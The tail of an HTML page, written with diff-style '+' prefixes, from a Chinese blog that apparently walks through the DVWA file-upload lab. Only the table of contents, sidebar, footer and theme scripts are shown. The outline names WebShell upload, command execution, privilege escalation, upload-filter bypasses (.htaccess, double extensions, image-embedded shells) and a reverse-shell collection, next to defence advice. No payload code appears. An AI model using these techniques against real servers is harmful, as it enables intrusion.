href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95WebShell"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">步骤1：创建简单WebShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E5%AE%8C%E6%95%B4%E7%9A%84WebShell"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">步骤2：创建功能完整的WebShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E4%B8%8A%E4%BC%A0WebShell"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">步骤3：上传WebShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E8%AE%BF%E9%97%AEWebShell"><span class="nav-number">1.3.4.4.</span> <span class="nav-text">步骤4：访问WebShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">1.3.4.5.</span> <span class="nav-text">步骤5：执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.4.6.</span> <span class="nav-text">步骤6：权限提升</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">1.4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">1.4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BD%BF%E7%94%A8Burp-Suite%E4%BF%AE%E6%94%B9Content-Type"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">方法1：使用Burp Suite修改Content-Type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97%EF%BC%88%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">方法2：使用文件头欺骗（图片马）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">1.5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">1.5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">1.5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">1.5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-number">1.5.5.1.</span> <span class="nav-text">方法1：创建图片马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%B8%8A%E4%BC%A0-htaccess"><span class="nav-number">1.5.5.2.</span> <span class="nav-text">方法2：上传.htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E5%8F%8C%E6%89%A9%E5%B1%95%E5%90%8D"><span class="nav-number">1.5.5.3.</span> <span class="nav-text">方法3：双扩展名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">1.6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">1.6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">1.6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">1.6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">1.7.1.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E9%AA%8C%E8%AF%81%EF%BC%88%E5%A4%9A%E5%B1%82%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">1. 文件类型验证（多层验证）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">2. 文件重命名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">3. 文件大小限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%AD%98%E5%82%A8%E5%9C%A8Web%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%A4%96"><span class="nav-number">1.7.1.4.</span> <span class="nav-text">4. 存储在Web根目录外</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E5%9B%BE%E7%89%87%E9%87%8D%E6%96%B0%E6%B8%B2%E6%9F%93%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-number">1.7.1.5.</span> <span class="nav-text">5. 图片重新渲染（推荐）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E8%AE%BE%E7%BD%AE%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%9D%83%E9%99%90"><span class="nav-number">1.7.1.6.</span> <span class="nav-text">6. 设置正确的权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2"><span class="nav-number">1.7.2.</span> <span class="nav-text">系统层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%A6%81%E6%AD%A2%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8CPHP"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">1. 禁止上传目录执行PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8%E4%B8%93%E9%97%A8%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">2. 使用专门的上传目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%89%AB%E6%8F%8F%E7%97%85%E6%AF%92"><span class="nav-number">1.7.2.3.</span> <span class="nav-text">3. 扫描病毒</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%B1%82%E9%9D%A2"><span class="nav-number">1.7.3.</span> <span class="nav-text">框架层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Laravel%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">Laravel示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">1.8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8WebShell%E9%9B%86%E5%90%88"><span class="nav-number">1.9.</span> <span class="nav-text">常用WebShell集合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95"><span class="nav-number">1.9.1.</span> <span class="nav-text">最简单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.9.2.</span> <span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%A6%E5%AF%86%E7%A0%81%E7%9A%84Shell"><span class="nav-number">1.9.3.</span> <span class="nav-text">带密码的Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">1.9.4.</span> <span class="nav-text">反弹Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.10.</span> <span class="nav-text">实战建议</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
